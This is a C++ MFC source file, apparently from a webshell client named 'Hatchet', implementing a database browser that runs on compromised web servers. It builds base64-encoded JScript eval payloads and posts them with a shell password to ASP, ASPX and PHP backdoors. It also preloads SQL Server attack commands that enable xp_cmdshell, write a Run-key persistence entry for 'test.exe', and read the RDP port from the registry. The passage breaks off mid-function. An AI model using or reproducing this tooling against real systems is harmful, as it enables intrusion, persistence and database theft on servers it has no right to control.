// DataDlg.cpp
//

#include "stdafx.h"
#include "Hatchet.h"
#include "DataDlg.h"
#include "SetpDataDlg.h"

// CDataDlg 对话框
DWORD WINAPI GetDataBases(LPVOID lpParam);	//线程
DWORD WINAPI GetTables(LPVOID lpParam);		//线程
DWORD WINAPI GetColumns(LPVOID lpParam);	//线程
DWORD WINAPI GetExecSql(LPVOID lpParam);	//线程
//////////////////////////////////////////////////////////////////////////

IMPLEMENT_DYNAMIC(CDataDlg, CDialog)

CDataDlg::CDataDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CDataDlg::IDD, pParent)
{

}

CDataDlg::~CDataDlg()
{
	DestroyWindow();
}

void CDataDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_DATA_TREE, m_datatree);
	DDX_Control(pDX, IDC_DATA_LIST, m_datalist);
	DDX_Control(pDX, IDC_COMBO_DATAS, m_comDatas);
	DDX_Control(pDX, IDC_EDIT_DATA_SUBITEM, m_SubItemEdit);
	DDX_Control(pDX, IDC_COMBO_SQL, m_com_sql);
}


BEGIN_MESSAGE_MAP(CDataDlg, CDialog)
	ON_WM_SIZE()
	ON_NOTIFY(NM_DBLCLK, IDC_DATA_TREE, OnNMDblclkTree1)
	ON_BN_CLICKED(IDC_BUTTON_EXECSQL, OnBnClickedButtonExecsql)
	ON_NOTIFY(NM_RCLICK, IDC_DATA_TREE, OnNMRClickTree1)
	ON_NOTIFY(NM_RCLICK, IDC_DATA_LIST, OnNMRClickList1)
	ON_COMMAND(ID_DATA_GETCOUNT, OnDataGetcount)						//获取表的个数
	ON_COMMAND(ID_DATATREE_QUERY20LINES, OnDataGet20Lines)				//获取20条数据
	ON_COMMAND(ID_DATATREE_DROPTABLE, OnDataDropTable)					//删除表
	ON_COMMAND(ID_DATA_SETCLIPBOARD, OnDataSetclipboard)
	ON_COMMAND(ID_DATA_EXPORTHTML, OnDataExportHtml)					//导出HTML
	ON_COMMAND(ID_DATA_EXPORTTEXT, OnDataExportText)					//导出Text
	ON_NOTIFY(NM_DBLCLK, IDC_DATA_LIST, OnNMDblclkList1)
	ON_EN_KILLFOCUS(IDC_EDIT_DATA_SUBITEM, OnKillFocusSubItemEdit)
	ON_BN_CLICKED(IDC_DATA_CONFIG, &CDataDlg::OnBnClickedDataConfig)
END_MESSAGE_MAP()


// CDataDlg 消息处理程序

void CDataDlg::OnSize(UINT nType, int cx, int cy)
{
	CDialog::OnSize(nType, cx, cy);

	CRect rcClient;
	GetClientRect(rcClient);

	CRect	rcCWnd = rcClient;
	CWnd*	pCWnd   =   GetDlgItem(IDC_DATA_CONFIG);
	if (pCWnd != NULL)
	{
		rcCWnd.bottom = 21;
		rcCWnd.right = 79;
		pCWnd->MoveWindow(rcCWnd);
	}

	rcCWnd = rcClient;
	pCWnd   =   GetDlgItem(IDC_COMBO_DATAS);
	if (pCWnd != NULL)
	{
		rcCWnd.bottom = 21;
		rcCWnd.left = 80;
		rcCWnd.right = 248;
		pCWnd->MoveWindow(rcCWnd);
	}

	rcCWnd = rcClient;
	pCWnd   =   GetDlgItem(IDC_COMBO_SQL);
	if (pCWnd != NULL)
	{
		rcCWnd.bottom = 21;
		rcCWnd.left = 250;
		rcCWnd.right = rcCWnd.right-60;
		pCWnd->MoveWindow(rcCWnd);
	}

	rcCWnd = rcClient;
	pCWnd   =   GetDlgItem(IDC_BUTTON_EXECSQL);
	if (pCWnd != NULL)
	{
		rcCWnd.bottom = 21;
		rcCWnd.left = rcCWnd.right-60;
		pCWnd->MoveWindow(rcCWnd);
	}

	rcCWnd = rcClient;
	pCWnd   =   GetDlgItem(IDC_DATA_TREE);
	if (pCWnd != NULL)
	{
		rcCWnd.top = 21;
		rcCWnd.left = 2;
		rcCWnd.right = 248;
		pCWnd->MoveWindow(rcCWnd);
	}

	rcCWnd = rcClient;
	pCWnd   =   GetDlgItem(IDC_DATA_LIST);
	if (pCWnd != NULL)
	{
		rcCWnd.top = 21;
		rcCWnd.left = 250;
		pCWnd->MoveWindow(rcCWnd);
	}
}


BOOL CDataDlg::PreTranslateMessage(MSG* pMsg)
{
	if(pMsg -> message == WM_KEYDOWN)
	{
		if ((pMsg->wParam == 'C' || pMsg->wParam == 'c') && ::GetKeyState(VK_CONTROL)&0x8000)	//复制
		{
			if (GetFocus() == GetDlgItem(IDC_DATA_TREE))
			{
				CString temp = m_datatree.GetItemText( m_datatree.GetSelectedItem() );
				if( OpenClipboard() )
				{
					HGLOBAL clipbuffer;
					char * buffer;
					EmptyClipboard();
					clipbuffer = GlobalAlloc(GMEM_DDESHARE, temp.GetLength()+1);
					buffer = (char*)GlobalLock(clipbuffer);
					strcpy_s(buffer, temp.GetLength()+1, LPCSTR(temp));
					GlobalUnlock(clipbuffer);
					SetClipboardData(CF_TEXT,clipbuffer);
					CloseClipboard();

					m_edit.SetWindowText( "SetClipboard: " + temp );					//设置状态栏
				}
			}else if (GetFocus() == GetDlgItem(IDC_DATA_LIST))
			{
				OnDataSetclipboard();									//复制到剪贴板
			}
		}

		if(pMsg -> wParam == VK_F2)
		{
			OnBnClickedDataConfig();			//数据库配置
		}
		if(pMsg -> wParam == VK_ESCAPE)
		{
			m_SubItemEdit.ShowWindow(SW_HIDE);
			m_datalist.SetFocus();
			return TRUE;
		}
		if(pMsg -> wParam == VK_RETURN)
		{
			if ((GetFocus()->GetParent()) == GetDlgItem(IDC_COMBO_SQL))
			{
				OnBnClickedButtonExecsql();		//执行Sql命令
				return TRUE;
			}else{
				return TRUE;
			}
		}
	}
	return CDialog::PreTranslateMessage(pMsg);
}
void CDataDlg::OnKillFocusSubItemEdit()			//失去焦点
{
	m_SubItemEdit.ShowWindow(SW_HIDE);
}


BOOL CDataDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	GetDlgItem(IDC_BUTTON_EXECSQL)->SetFont(&m_FontSample);
	GetDlgItem(IDC_DATA_TREE)->SetFont(&m_FontSample);
	GetDlgItem(IDC_DATA_LIST)->SetFont(&m_FontSample);
	GetDlgItem(IDC_COMBO_SQL)->SetFont(&m_FontSample);
	GetDlgItem(IDC_COMBO_DATAS)->SetFont(&m_FontSample);
	GetDlgItem(IDC_EDIT_DATA_SUBITEM)->SetFont(&m_FontSample);
	GetDlgItem(IDC_DATA_CONFIG)->SetFont(&m_FontSample);


	m_edit.SetWindowText( "Database Management" );					//设置状态栏

	szSiteUrl = szGlobal_SiteUrl;
	szSitePass = szGlobal_SitePass;
	nSiteCode = nGlobal_SiteCode;
	szSiteConfig = szGlobal_SiteConfig;
	nSiteScript	=	nGlobal_SiteScript;
	
	if (nSiteCode == 65001)
	{
		szSiteCode = "UTF-8";
	}
	else if (nSiteCode == 936)
	{
		szSiteCode = "GB2312";
	}
	else if (nSiteCode == 950)
	{
		szSiteCode = "BIG5";
	}else{
		szSiteCode = "";
	}

	m_SubItemEdit.ShowWindow(SW_HIDE);		//List就地编辑
	// TODO:  在此添加额外的初始化
	m_iImageTree.Create(16, 16, ILC_COLORDDB|ILC_MASK,10, 10);					//树形框，文件夹 列表
	m_iImageTree.Add( AfxGetApp()->LoadIcon(IDI_DATA) );
	m_iImageTree.Add( AfxGetApp()->LoadIcon(IDI_TABLE) );
	m_iImageTree.Add( AfxGetApp()->LoadIcon(IDI_COLUMNS) );
	m_datatree.SetImageList ( &m_iImageTree,TVSIL_NORMAL );

	//GetDataBases();
	bThreadFinish = false;
	CreateThread(NULL, 0, GetDataBases, (LPVOID)this, 0, 0);

	RECT mRect;
	m_comDatas.GetWindowRect(&mRect);
	m_comDatas.SetWindowPos(NULL,0, 0, mRect.right-mRect.left, 200, SWP_NOMOVE|SWP_NOREDRAW);

	//////////////////////////////////////////////////////////////////////////
	if (nSiteScript == 1 || nSiteScript == 2)
	{
		m_com_sql.AddString("SELECT IS_SRVROLEMEMBER('sysadmin')");
		m_com_sql.AddString("EXEC master..xp_cmdshell 'set'");
		m_com_sql.AddString("EXEC master..xp_regread 'HKEY_LOCAL_MACHINE','SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp','PortNumber'");
		m_com_sql.AddString("EXEC master..xp_regwrite HKEY_LOCAL_MACHINE,'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run','F','REG_SZ','test.exe'");
		m_com_sql.AddString("EXEC master..xp_dirtree 'C:\\',1,1");
		m_com_sql.AddString("EXEC master..sp_addextendedproc 'xp_cmdshell','xplog70.dll'");
		m_com_sql.AddString("EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE");
	}
	m_com_sql.GetWindowRect(&mRect);
	m_com_sql.SetWindowPos(NULL,0, 0, mRect.right-mRect.left, 200, SWP_NOMOVE|SWP_NOREDRAW);
	//////////////////////////////////////////////////////////////////////////


	// TODO:  在此添加额外的初始化
	LRESULT lstyle = m_datalist.SendMessage(LVM_GETEXTENDEDLISTVIEWSTYLE);
	lstyle |= LVS_EX_FULLROWSELECT| LVS_EX_GRIDLINES  ; //LVS_EX_CHECKBOXES | LVS_EX_FULLROWSELECT| LVS_EX_GRIDLINES 
	m_datalist.SendMessage(LVM_SETEXTENDEDLISTVIEWSTYLE,0,(LPARAM)lstyle);


	return TRUE;  // return TRUE unless you set the focus to a control
	// 异常: OCX 属性页应返回 FALSE
}


void CDataDlg::OnNMDblclkTree1(NMHDR *pNMHDR, LRESULT *pResult)				//双击树形框，获取该数据库的表名或列名
{
	*pResult = 0;

	CPoint point(GetMessagePos());
	m_datatree.ScreenToClient(&point);
	UINT uFlag;
	HTREEITEM m_hItem = m_datatree.HitTest(point,&uFlag); //返回与CtreeCtrl关联的光标的当前位置和句柄

	CString szDatabases = m_datatree.GetItemText(m_hItem);
	if (szDatabases != "")
	{
		HTREEITEM hParent = m_hItem;
		hParent = m_datatree.GetParentItem( hParent );
		if (hParent)									// 获取列名
		{
			if (m_datatree.GetParentItem( hParent ))
			{
				//这里是列，三层
				//AfxMessageBox( m_datatree.GetItemText(ht.hItem) );
			}else{
				if (bThreadFinish)
				{
					GetColumns_hParent = m_hItem;
					GetColumns_szDataName = m_datatree.GetItemText(hParent);
					GetColumns_szTableName = m_datatree.GetItemText(m_hItem);
					bThreadFinish = false;
					CreateThread(NULL, 0, GetColumns, (LPVOID)this, 0, 0);
				}else{
					m_edit.SetWindowText( "GetColumns Threads busy" );					//设置状态栏
				}
			}
		}else{											// 获取表名
			if (bThreadFinish)
			{
				GetTables_hParent = m_hItem;
				GetTables_szDataName = m_datatree.GetItemText(m_hItem);
				bThreadFinish = false;
				CreateThread(NULL, 0, GetTables, (LPVOID)this, 0, 0);
			}else{
				m_edit.SetWindowText( "GetTables Threads busy" );					//设置状态栏
			}
		}
	}
}


void CDataDlg::OnDataSetclipboard()										//复制到剪贴板
{
	int nList = m_datalist.GetNextItem(-1,LVNI_SELECTED);
	if (nList < 0) return;//修正获取列表框数据的小问题。

	int nIndex=(int)CtrlListHeaderArr.GetCount();					//几列
	CString szDataSetclipboard = "";
	for (int j = 0; j < nIndex; j++)
	{
		szDataSetclipboard += m_datalist.GetItemText(nList, j) + "\r\n";
	}
	if( OpenClipboard() )
	{
		HGLOBAL clipbuffer;
		char * buffer;
		EmptyClipboard();
		clipbuffer = GlobalAlloc(GMEM_DDESHARE, szDataSetclipboard.GetLength()+1);
		buffer = (char*)GlobalLock(clipbuffer);
		strcpy_s(buffer, szDataSetclipboard.GetLength()+1, LPCSTR(szDataSetclipboard));
		GlobalUnlock(clipbuffer);
		SetClipboardData(CF_TEXT,clipbuffer);
		CloseClipboard();

		m_edit.SetWindowText( "SetClipboard completed" );					//设置状态栏
	}
	m_datalist.SetFocus();
}


void CDataDlg::OnDataExportHtml()												//导出到HTML
{
	CString temp ="";
	if (m_datalist.GetItemCount() < 1) return;	//没有东西，不用导出

	char DesktopPath[255];
	SHGetSpecialFolderPath(0,DesktopPath,CSIDL_DESKTOPDIRECTORY,0);
	sprintf_s(DesktopPath, 255, "%s\\table.html",DesktopPath);
	CFileDialog hFileDlg(FALSE, NULL , DesktopPath, OFN_OVERWRITEPROMPT | OFN_HIDEREADONLY | OFN_NOCHANGEDIR,TEXT("WebPage(*.html)|*.html|All files(*.*)|*.*|"),NULL);

	if(hFileDlg.DoModal() != IDOK)
	{
		return;
	}
	CString szFileName=hFileDlg.GetPathName();
	if (szFileName.Find(".",0) == -1)
	{
		szFileName = szFileName + ".html";
	}
	CStdioFile pFile;
	if ( pFile.Open(szFileName, CFile::modeCreate|CFile::modeWrite) == FALSE)
	{
		AfxMessageBox("Open Save File Error.");
		m_datalist.SetFocus();
		return;
	}
	GetDlgItemText(IDC_COMBO_SQL, temp);		//获取SQL语句

	pFile.WriteString("<html><head><meta http-equiv=content-type content=\"text/html; charset=GBK\">\n"
		"<style>*{font-size:12px;}table{background:#DDD;border:solid 2px #CCC;}td{background:#FFF;}\n"
		".th td{background:#EEE;font-weight:bold;height:28px;color:#008;}\n"
		"div{border:solid 1px #DDD;background:#FFF;padding:3px;color:#00B;}</style>\n"
		"<title>Export Table</title></head><body>\n"
		"<div>"+temp+"</div><br/>\n"
		"<table border=\"0\" cellspacing=\"1\" cellpadding=\"3\">\n"
		"<tr class=\"th\">");

	/*
	TCHAR szText[100] = { 0 };
	HDITEM hdi = { 0 };
	hdi.mask = HDI_TEXT;
	hdi.pszText = szText;
	hdi.cchTextMax = 100;
	for (int i = 1; i < nColumn; i++)
	{
	m_datalist.GetItem(i, &hdi);
	pFile.WriteString( "<td>"+ hdi.pszText +"</td>" );
	}
	*/
	int nIndex=(int)CtrlListHeaderArr.GetCount();
	int ni=0;
	while(ni < nIndex)
	{
		pFile.WriteString( "<td>"+CtrlListHeaderArr.GetAt(ni)+"</td>" );
		ni++;
	}
	pFile.WriteString( "<tr>" );	//头部完成
	//////////////////////////////////////////////////////////////////////////
	int jColumn = m_datalist.GetItemCount();
	for (int i=0 ; i < jColumn; i++)
	{
		pFile.WriteString( "<tr style=\"\">" );
		for (int j = 0; j < nIndex; j++)
		{
			pFile.WriteString( "<td>"+ m_datalist.GetItemText(i, j) +"</td>" );
		}
		pFile.WriteString( "<tr>\n" );
	}
	//////////////////////////////////////////////////////////////////////////
	temp.Format("%d", jColumn);
	pFile.WriteString( "</table>\n"
		"<br/><div>Return "+temp+" rows</div>\n"
		"</body></html>");
	pFile.Close();
	m_edit.SetWindowText( "Export completed" );					//设置状态栏
	m_datalist.SetFocus();
}


void CDataDlg::OnNMDblclkList1(NMHDR *pNMHDR, LRESULT *pResult)										//就地编辑
{
//	LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast<LPNMITEMACTIVATE>(pNMHDR);
	
	NM_LISTVIEW *pNMListCtrl = (NM_LISTVIEW *)pNMHDR;
	if(pNMListCtrl->iItem != -1)
	{
		CRect rect,dlgRect;
		/*
		获得当前列的宽度以适应如果用户调整宽度
		此处不用获得的子项rect矩形框来设置宽度
		是因第一列时返回的宽度是整行的宽度，我也不知道为啥
		*/
		int width = m_datalist.GetColumnWidth(pNMListCtrl->iSubItem);
		m_datalist.GetSubItemRect(pNMListCtrl->iItem,pNMListCtrl->iSubItem,LVIR_BOUNDS,rect);

		//获得listctrl矩形框
		//获得父对话框的位置以调整CEdit的显示位置，具体见下面代码
		m_datalist.GetWindowRect(&dlgRect);
		//调整与父窗口对应
		ScreenToClient(&dlgRect);
		int height = rect.Height();
		rect.top += (dlgRect.top+1);
		rect.left += (dlgRect.left+5);
		rect.bottom = rect.top+height+2;
		rect.right = rect.left+width-5;
		m_SubItemEdit.MoveWindow(&rect);
		m_SubItemEdit.SetWindowText( m_datalist.GetItemText(pNMListCtrl->iItem, pNMListCtrl->iSubItem) );
		m_SubItemEdit.SetSel(0,-1);
		m_SubItemEdit.ShowWindow(SW_SHOW);
		m_SubItemEdit.SetFocus();
	}

	*pResult = 0;
}

void CDataDlg::OnBnClickedButtonExecsql()		//执行Sql命令
{
	if (bThreadFinish)
	{
		GetDlgItemText(IDC_COMBO_SQL, GetExecSql_szSql);
		bThreadFinish = false;
		m_edit.SetWindowText( "Please wait..." );					//设置状态栏
		CreateThread(NULL, 0, GetExecSql, (LPVOID)this, 0, 0);
	}else{
		m_edit.SetWindowText( "GetExecSql Threads busy" );					//设置状态栏
	}
}

void CDataDlg::OnNMRClickTree1(NMHDR *pNMHDR, LRESULT *pResult)			//右键 数据库 Tree
{
	CPoint point(GetMessagePos());
	m_datatree.ScreenToClient(&point);
	UINT uFlag;
	select_ht = m_datatree.HitTest(point,&uFlag); //返回与CtreeCtrl关联的光标的当前位置和句柄
	m_datatree.SelectItem(select_ht);
	HTREEITEM ht1,ht2;
	ht1 = m_datatree.GetParentItem(select_ht);			//如果没有父节点，ht1 NULL，那么是第一层就是 数据库名
	ht2 = m_datatree.GetParentItem(ht1);						//如果父节点的父节点还有，那么是第三层就是 列名
	if (select_ht == NULL || ht1 == NULL || ht2 != NULL)
	{
		return;
	}

	CMenu popMenu;
	VERIFY(popMenu.LoadMenu(IDR_MENU1));
	CMenu *p=popMenu.GetSubMenu(2);
	ASSERT(p!=NULL);
	CPoint pt;
	GetCursorPos(&pt);
	p->TrackPopupMenu(TPM_LEFTALIGN|TPM_LEFTBUTTON, pt.x, pt.y, this);

	*pResult = 0;
}


void CDataDlg::OnNMRClickList1(NMHDR *pNMHDR, LRESULT *pResult)			//右键 数据库 List
{
	LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast<LPNMITEMACTIVATE>(pNMHDR);

	CMenu popMenu;
	VERIFY(popMenu.LoadMenu(IDR_MENU1));
	CMenu *p=popMenu.GetSubMenu(3);
	ASSERT(p!=NULL);
	CPoint pt;
	GetCursorPos(&pt);
	p->TrackPopupMenu(TPM_RIGHTBUTTON, pt.x, pt.y,this);

	*pResult = 0;
}


void CDataDlg::OnDataGetcount()											//右键，获取表个数
{
	//AfxMessageBox("获取表个数: SELECT COUNT(1) FROM `"+m_datatree.GetItemText(select_ht.hItem)+"`" );
	CString temp ="";

	HTREEITEM ht1 = m_datatree.GetParentItem(select_ht);
	m_comDatas.SetCurSel( m_comDatas.FindStringExact(0, m_datatree.GetItemText(ht1)) );		//设置现在选择的数据库名

	temp = "Select Count(*) As CNT From "+m_datatree.GetItemText(select_ht);
	

	if (bThreadFinish)
	{
		SetDlgItemText(IDC_COMBO_SQL, temp);

		GetExecSql_szSql = temp;
		bThreadFinish = false;
		CreateThread(NULL, 0, GetExecSql, (LPVOID)this, 0, 0);
	}else{
		m_edit.SetWindowText( "GetExecSql Threads busy" );					//设置状态栏
	}

	m_datatree.SetFocus();
}


void CDataDlg::OnBnClickedDataConfig()			//数据库配置
{
	if (bThreadFinish == false)
	{
		m_edit.SetWindowText( "GetDataBases Threads busy" );					//设置状态栏
		return;
	}
	CSetpDataDlg dlg;
	dlg.szSiteUrl = szSiteUrl;
	dlg.nSiteScript = nSiteScript;
	if (dlg.DoModal() == IDOK)
	{
		m_comDatas.ResetContent();
		m_datatree.DeleteAllItems();
		szSiteConfig = szGlobal_SiteConfig;
		//GetDataBases();
		bThreadFinish = false;
		CreateThread(NULL, 0, GetDataBases, (LPVOID)this, 0, 0);
	}
}

void CDataDlg::OnDataExportText()												//导出到TEXT
{
	if (m_datalist.GetItemCount() < 1) return;	//没有东西，不用导出

	CString temp ="";
	char DesktopPath[255];
	SHGetSpecialFolderPath(0,DesktopPath,CSIDL_DESKTOPDIRECTORY,0);
	sprintf_s(DesktopPath, 255, "%s\\table.txt",DesktopPath);
	CFileDialog hFileDlg(FALSE, NULL , DesktopPath, OFN_OVERWRITEPROMPT | OFN_HIDEREADONLY | OFN_NOCHANGEDIR,TEXT("Text files(*.txt)|*.txt|All files(*.*)|*.*|"),NULL);

	if(hFileDlg.DoModal() != IDOK)
	{
		return;
	}
	temp = hFileDlg.GetPathName();				//文件名和分隔符
	CString szFileName="", szFileContentSplit="\t";
	int posX = temp.Find("&&");
	if (posX != -1)
	{
		szFileName = temp.Left(posX);

		szFileContentSplit = temp.Mid(posX+2, temp.GetLength()-posX-2);
	}else{
		szFileName = temp;
	}
	szFileName.TrimLeft();
	szFileName.TrimRight();

	m_edit.SetWindowText( "Export File: "+ szFileName +" Split: "+ szFileContentSplit );					//设置状态栏

	if (szFileName.Find(".",0) == -1)
	{
		szFileName = szFileName + ".txt";
	}

	CStdioFile pFile;
	if ( pFile.Open(szFileName, CFile::modeCreate|CFile::modeWrite) == FALSE)
	{
		AfxMessageBox("Open save file error.");
		m_datalist.SetFocus();
		return;
	}

	int nIndex=(int)CtrlListHeaderArr.GetCount();
	int jColumn = m_datalist.GetItemCount();
	for (int i=0 ; i < jColumn; i++)
	{
		for (int j = 0; j < nIndex; j++)
		{
			if (j+1 == nIndex)
			{
				pFile.WriteString( m_datalist.GetItemText(i, j) );
			}else{
				pFile.WriteString( m_datalist.GetItemText(i, j) + szFileContentSplit );
			}
		}
		pFile.WriteString( "\n" );
	}

	pFile.Close();
	m_edit.SetWindowText( "Export completed" );					//设置状态栏
	m_datalist.SetFocus();
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

DWORD WINAPI GetDataBases(LPVOID lpParam)	//线程
{
	CDataDlg* pDlg = (CDataDlg*)lpParam;

	m_edit.SetWindowText( "Reading DataBases." );					//设置状态栏

	CString temp ="";
	int posX=0,posY=0;
	CString szDataType;
	CString szDataHost,szDataUser,szDataPass;
	if (pDlg->nSiteScript == 1)																		// ASP
	{
		posX = pDlg->szSiteConfig.Find("<C>");
		if (posX == -1)
		{
			pDlg->bThreadFinish = true;
			m_edit.SetWindowText( "Error" );					//设置状态栏
			return 0;
		}
		posY = pDlg->szSiteConfig.Find("</C>", posX+1);
		if (posY == -1)
		{
			pDlg->bThreadFinish = true;
			m_edit.SetWindowText( "Error" );					//设置状态栏
			return 0;
		}
		szDataType = pDlg->szSiteConfig.Mid(posX+3, posY-posX-3);
		temp = szDataType;
		temp.MakeUpper();		//转大写比较
		if (temp.Find("DRIVER={SQL") != -1)
		{
			szDataType = UrlEnCode(pDlg->nSiteCode, szDataType, false, true);
			bHttpIsOK = MyHttp(pDlg->szSiteUrl, pDlg->szSitePass + szDataAspSqlServer + szDataType, pDlg->nSiteCode, temp, szError);
		}
		else if (temp.Find("PROVIDER=SQLOLEDB") != -1 ||
			temp.Find("DRIVER={MYSQL}") != -1 ||
			temp.Find("PROVIDER=ORAOLEDB") != -1 ||
			temp.Find("PROVIDER=MSDAORA") != -1 ||
			temp.Find("DSN=") != -1 )
		{
			szDataType = UrlEnCode(pDlg->nSiteCode, szDataType, false, true);
			bHttpIsOK = MyHttp(pDlg->szSiteUrl, pDlg->szSitePass + szDataAsp1 + szDataType, pDlg->nSiteCode, temp, szError);
		}
		else if (temp.Find("DRIVER={MICROSOFT") != -1 ||
			temp.Find("PROVIDER=MICROSOFT") != -1)
		{
			posX = rfind(szDataType,"\\");
			if (posX == -1)
			{
				posX = rfind(szDataType,"/");
				if (posX == -1)
				{
					m_edit.SetWindowText( "Type of filename does not recognize." );					//设置状态栏
					AfxMessageBox("Type of filename does not recognize.");
					pDlg->bThreadFinish = true;
					return 0;
				}
			}
			CString szAccessFileName = szDataType.Right(posX-1);
			szAccessFileName = UrlEnCode(pDlg->nSiteCode, szAccessFileName);
			szDataType = UrlEnCode(pDlg->nSiteCode, szDataType, false, true);
			bHttpIsOK = MyHttp(pDlg->szSiteUrl, pDlg->szSitePass+szDataAsp2 + szDataType +"&z2="+ szAccessFileName, pDlg->nSiteCode, temp, szError);
		}
		else{
			m_edit.SetWindowText( "Type of database does not recognize." );					//设置状态栏
			AfxMessageBox("Type of database does not recognize.");
			pDlg->bThreadFinish = true;
			return 0;
		}
		//AfxMessageBox("ASP: "+ szSiteConfig );
	}else if (pDlg->nSiteScript ==2)																		//ASPX
	{
		posX = pDlg->szSiteConfig.Find("<C>");
		if (posX == -1)
		{
			m_edit.SetWindowText( "Error" );					//设置状态栏
			pDlg->bThreadFinish = true;
			return 0;
		}
		posY = pDlg->szSiteConfig.Find("</C>", posX+1);
		if (posY == -1)
		{
			m_edit.SetWindowText( "Error" );					//设置状态栏
			pDlg->bThreadFinish = true;
			return 0;
		}
		szDataType = pDlg->szSiteConfig.Mid(posX+3, posY-posX-3);
		temp = szDataType;
		temp.MakeUpper();		//转大写比较

		CString szDataFamatPageCode;
		szDataFamatPageCode.Format("%d", pDlg->nSiteCode);

		if (temp.Find("DRIVER={SQL") != -1)
		{
			temp = "";
			temp = MyBase64Encode(pDlg->nSiteCode, szDataType);
			temp = szDataAspxSqlServer + temp;
			temp.Replace("%nPageCode%", szDataFamatPageCode);

			CString szBase64EvalCode = "var Conn=new ActiveXObject(\"Adodb.connection\");Conn.Open(System.Text.Encoding.GetEncoding("+ szDataFamatPageCode +").GetString"
				"(System.Convert.FromBase64String(Request.Item[\"z1\"])));var Rs=new ActiveXObject(\"ADODB.Recordset\");Rs.Open(\"SELECT [name] F"
				"ROM master.dbo.sysdatabases ORDER BY 1\",Conn,1,1);while(!Rs.EOF && !Rs.BOF){Response.Write(Rs.Fields(0).Value+\"\\t\");Rs.MoveNext();}Rs.Close();Conn.Close();";
			szBase64EvalCode = MyBase64Encode(-1, szBase64EvalCode);
			temp.Replace("%szBase64EvalCode%", szBase64EvalCode);

			bHttpIsOK = MyHttp(pDlg->szSiteUrl, pDlg->szSitePass + temp, pDlg->nSiteCode, temp, szError);
		}
		else if (temp.Find("PROVIDER=SQLOLEDB") != -1 ||
			temp.Find("DRIVER={MYSQL}") != -1 ||
			temp.Find("PROVIDER=ORAOLEDB") != -1 ||
			temp.Find("PROVIDER=MSDAORA") != -1 ||
			temp.Find("DSN=") != -1 )
		{
			temp = "";
			temp = MyBase64Encode(pDlg->nSiteCode, szDataType);
			temp = szDataAspx1 + temp;
			temp.Replace("%nPageCode%", szDataFamatPageCode);

			CString szBase64EvalCode = "var Conn=new ActiveXObject(\"Adodb.connection\");Conn.Open(System.Text.Encoding.GetEncoding("+ szDataFamatPageCode +").GetStr"
				"ing(System.Convert.FromBase64String(Request.Item[\"z1\"])));Response.Write(\"[ADO DATABASE]\\t\");Conn.Close();";
			szBase64EvalCode = MyBase64Encode(-1, szBase64EvalCode);
			temp.Replace("%szBase64EvalCode%", szBase64EvalCode);

			bHttpIsOK = MyHttp(pDlg->szSiteUrl, pDlg->szSitePass+ temp, pDlg->nSiteCode, temp, szError);
		}
		else if (temp.Find("DRIVER={MICROSOFT") != -1 ||
			temp.Find("PROVIDER=MICROSOFT") != -1)
		{
			posX = rfind(szDataType,"\\");
			if (posX == -1)
			{
				posX = rfind(szDataType,"/");
				if (posX == -1)
				{
					m_edit.SetWindowText( "Type of database does not recognize." );					//设置状态栏
					AfxMessageBox("Type of filename does not recognize.");
					pDlg->bThreadFinish = true;
					return 0;
				}
			}
			CString szAccessFileName = szDataType.Right(posX-1);
			szAccessFileName = UrlEnCode(pDlg->nSiteCode, szAccessFileName);
			temp = "";
			temp = MyBase64Encode(pDlg->nSiteCode, szDataType);
			temp = szDataAspx2 + temp;
			temp.Replace("%nPageCode%", szDataFamatPageCode);

			CString szBase64EvalCode = "var Conn=new ActiveXObject(\"Adodb.connection\");Conn.Open(System.Text.Encoding.GetEncoding("+ szDataFamatPageCode +").Get"
				"String(System.Convert.FromBase64String(Request.Item[\"z1\"])));Response.Write(Request.Item[\"z2\"]+\"\\t\");Conn.Close();";
			szBase64EvalCode = MyBase64Encode(-1, szBase64EvalCode);
			temp.Replace("%szBase64EvalCode%", szBase64EvalCode);

			bHttpIsOK = MyHttp(pDlg->szSiteUrl, pDlg->szSitePass+ temp +"&z2="+ szAccessFileName, pDlg->nSiteCode, temp, szError);
		}
		else{
			m_edit.SetWindowText( "Type of database does not recognize." );					//设置状态栏
			AfxMessageBox("Type of database does not recognize.");
			pDlg->bThreadFinish = true;
			return 0;
		}
		//AfxMessageBox("ASPX: "+ szSiteConfig );
	}else if (pDlg->nSiteScript == 3)																		//PHP
	{
		posX = pDlg->szSiteConfig.Find("<T>");
		if (posX == -1)
		{
			m_edit.SetWindowText( "Error" );					//设置状态栏
			pDlg->bThreadFinish = true;
			return 0;
		}
		posY = pDlg->szSiteConfig.Find("</T>", posX+1);
		if (posY == -1)
		{
			m_edit.SetWindowText( "Error" );					//设置状态栏
			pDlg->bThreadFinish = true;
			return 0;
		}
		szDataType = pDlg->szSiteConfig.Mid(posX+3, posY-posX-3);

		posX = pDlg->szSiteConfig.Find("<H>");
		posY = pDlg->szSiteConfig.Find("</H>", posX+1);
		szDataHost = pDlg->szSiteConfig.Mid(posX+3, posY-posX-3);
		szDataHost = UrlEnCode(pDlg->nSiteCode, szDataHost);

		posX = pDlg->szSiteConfig.Find("<U>");
		posY = pDlg->szSiteConfig.Find("</U>", posX+1);
		szDataUser = pDlg->szSiteConfig.Mid(posX+3, posY-posX-3);
		szDataUser = UrlEnCode(pDlg->nSiteCode, szDataUser);

		posX = pDlg->szSiteConfig.Find("<P>");
		posY = pDlg->szSiteConfig.Find("</P>", posX+1);
		szDataPass = pDlg->szSiteConfig.Mid(posX+3, posY-posX-3);
		szDataPass = UrlEnCode(pDlg->nSiteCode, szDataPass);

		szDataType.MakeUpper();								//转大写比较
		if (szDataType == "INFORMIX")
		{
			bHttpIsOK = MyHttp(pDlg->szSiteUrl, pDlg->szSitePass+szDataPhpInformix +szDataHost+"&z2="+szDataUser+"&z3="+szDataPass, pDlg->nSiteCode, temp, szError);

		}else if (szDataType == "ORACLE")
		{
